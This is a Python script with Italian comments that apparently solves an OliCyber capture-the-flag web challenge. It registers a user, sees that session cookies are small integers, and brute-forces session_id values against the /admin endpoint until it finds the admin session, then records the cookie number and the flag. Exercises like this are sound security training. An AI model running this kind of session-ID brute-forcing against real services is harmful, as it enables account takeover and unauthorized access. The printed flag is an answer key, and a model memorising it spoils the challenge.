import requests

#provo a fare una serie di registrazioni come dice il primo hint e osservo
#la risposta del cookie di sessione come dice il secondo hint.

#noto che il cookie di sessione è sempre un numero intero facendo un bruteforce
#di tutti i numeri ottengo quello che nella risposta contiene la flag

#ps essendo il codice già usato, runnando non mostra il cookie
#basta cambiare l'username e prpovare più volte per capire come funziona la chall


# Dati per la registrazione
register_data = {
    "username": "SofiaScalzo",
    "password": "password123"
}

# Effettua la richiesta POST per la registrazione
response = requests.post("http://too-small-reminder.challs.olicyber.it/register", json=register_data)

# Verifica lo stato della risposta
if response.status_code == 200:
    print("Registrazione effettuata con successo!")

    # Effettua una richiesta GET al percorso "/login" per ottenere il cookie di sessione
    login_response = requests.post("http://too-small-reminder.challs.olicyber.it/login", json=register_data)
    session_cookie = login_response.cookies.get("session_id")

    if session_cookie:
        print("Cookie di sessione assegnato:", session_cookie)
    else:
        print("Errore durante l'ottenimento del cookie di sessione.")
else:
    print("Errore durante la registrazione:", response.text)


# in questa seconda parte di codice faccio il brute force inviando tutti 
#i valori possibili del cookie finchè non trovo la flag

test=""
i=0
while "flag" not in test:
    cookie={"session_id":str(i)}
    r=requests.get("http://too-small-reminder.challs.olicyber.it/admin",cookies=cookie)
    test=r.text
    print(i)
    i+=1
print(i)
print(test)

#337
#{"messaggio":"Bentornato admin! flag{d0n7_cr3473_y0ur_535510n5}"}